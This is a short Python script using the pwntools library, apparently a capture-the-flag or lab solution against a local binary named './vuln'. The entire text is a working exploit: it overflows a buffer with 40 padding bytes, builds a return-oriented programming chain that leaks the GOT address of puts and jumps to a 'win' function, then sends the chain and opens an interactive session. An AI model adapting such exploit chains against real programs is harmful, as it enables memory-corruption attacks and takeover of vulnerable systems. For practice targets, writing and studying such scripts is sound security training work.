from pwn import *
context.clear(arch='i386')
elf = ELF('./vuln')

rop = ROP(elf)

rop.raw("A" * 40)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['win'])
p = process('./vuln')

p.send(rop.chain())
p.interactive()
